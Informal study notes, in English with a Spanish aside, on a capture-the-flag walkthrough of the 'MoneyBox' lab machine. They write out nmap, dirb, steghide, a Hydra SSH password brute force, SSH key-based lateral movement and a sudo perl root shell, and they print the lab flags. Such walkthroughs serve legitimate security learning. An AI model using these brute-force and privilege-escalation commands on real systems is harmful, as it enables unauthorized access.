We create the folder where we are going to work and then we scan with nmap
the result is on this folder
**/Documentos/Workspace/Virtual machines/pentesting/moneybox/moneybox**

Now we know that there is the port 
21/ftp open 
22/ssh open
80/tcp open

I know the versions but there are in the scan text that i have made. This huy was dowloaded filezilla
*He used filezilla putting the ip of the machine and the port 21 /ftp open *

He said that appears that it haves an anonymous ftp , and the only file that we can get was a picture.jpg


![[filezila.png]]

its just a picture of a cat ant he said " im wondering if there is some kind of #stagnograpy there " (???????????)

Now he is using #dirb and he put the ip of the victim (is looking for  directorys)
and this is what we find 

![[dirb.png]]
```
sudo dirb http://192.168.1.149
```
we are going to see  "  http://192.168.1.149/blogs/index.html  "

And in the source code we found this
![[sourcecode.png]]
and we find this
a "secret key"
![[key1.png]]

we are making some notes on the same folder that we are working the archive is "money box notes"

Now he is going to use #steghide with the comand
sudo apt install steghide
#steganography

![[steghide.png]]

we use the and --extract -sf
when we use this we need to put the word extractdata .. that code aparently
![[steghide 1.png]]
now we obtained a data.txt

**And data.txt is just a text that awares a guy called renu about change his password because it is too week**

he have an SSH open, so now we are going to do a bruteforce to renu with hydra and we are going to use rockyou.txt #hydra


```
sudo hydra -l renu -P rockyou.txt 192.168.1.149 ssh
```
![[hydraatak.png]]
and we have the password
![[passworddd.png]]
```
now if we want to use it we must put  

          ssh renu@192.168.1.149

```
now the machine ask us about some  finger prints we must answer "yes" or "y" (I think the correct wa is yes) 
we have access
and we have the first flag
![[flag.png]]


and the flag number two is in the folder lyly 
us3r{F14g:tr5827r5wu6nklao}
![[lyly.png]]

The third flag must be de root user
when we try to use sudo we cannot acces on MoneyBox (?????)
```
renu@MoneyBox:/home/lily$ sudo -l
[sudo] password for renu: 
Sorry, user renu may not run sudo on MoneyBox.
```
Aparently we have some hidden folders and one of them have interesting information a kind of key or hash of  

renu@debian

```
renu@MoneyBox:/home/lily$ ls -la
total 36
drwxr-xr-x 4 lily lily 4096 Feb 26  2021 .
drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
-rw------- 1 lily lily  985 Feb 26  2021 .bash_history
-rw-r--r-- 1 lily lily  220 Feb 25  2021 .bash_logout
-rw-r--r-- 1 lily lily 3526 Feb 25  2021 .bashrc
drwxr-xr-x 3 lily lily 4096 Feb 25  2021 .local
-rw-r--r-- 1 lily lily  807 Feb 25  2021 .profile
drwxr-xr-x 2 lily lily 4096 Feb 26  2021 .ssh
-rw-r--r-- 1 lily lily   65 Feb 26  2021 user2.txt
renu@MoneyBox:/home/lily$ cd .ssh
renu@MoneyBox:/home/lily/.ssh$ ls
authorized_keys
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
renu@MoneyBox:/home/lily/.ssh$ 
```

we entered to the lyly user without password

aparentemente por que lily tenia cargada la key ahi en esa carpeta de .ssh segun lo que dijo el chico aunque no entendi bien por que tenemos acceso a la cuenta ...

```
renu@MoneyBox:/home/lily/.ssh$ ssh lily@192.168.1.149
The authenticity of host '192.168.1.149 (192.168.1.149)' can't be established.
ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.1.149' (ECDSA) to the list of known hosts.
Linux MoneyBox 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80
lily@MoneyBox:~$ 

```

sudo -l gives us this

```
lily@MoneyBox:~$ sudo -l
Matching Defaults entries for lily on MoneyBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
lily@MoneyBox:~$ 

```

now we are using this website that have exploits with perl of reverse shells https://gtfobins.github.io/gtfobins/perl/

At the first time we been confused, we must put :

*sudo perl -e 'exec "/bin/sh";'* 

and not ;

*/usr/bin/perl -e 'exec "/bin/sh";'*

```
lily@MoneyBox:~$ /usr/bin/perl -e 'exec "/bin/sh";'
$ whoami
lily
$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
# 

```

and we have the third flag 
```
# pwd
/root
# ls -la
total 28
drwx------  3 root root 4096 Feb 26  2021 .
drwxr-xr-x 18 root root 4096 Feb 25  2021 ..
-rw-------  1 root root 2097 Feb 26  2021 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root 4096 Feb 25  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  228 Feb 26  2021 .root.txt
# cat .root.txt       

Congratulations.......!

You Successfully completed MoneyBox

Finally The Root Flag
    ==> r00t{H4ckth3p14n3t}

I'm Kirthik-KarvendhanT
    It's My First CTF Box
         
instagram : ____kirthik____

See You Back....
       
# 
```